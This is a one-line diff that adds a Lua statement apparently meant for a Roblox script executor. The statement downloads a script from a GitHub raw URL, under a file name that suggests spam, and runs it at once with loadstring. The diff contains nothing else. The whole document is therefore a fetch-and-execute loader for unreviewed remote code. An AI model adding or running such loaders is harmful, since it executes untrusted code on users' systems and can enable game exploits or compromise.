@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/PanelTrailNight/loaders/main/loaders/apple-ipad-original-spam1-lu3eqweug07tap.lua"))()
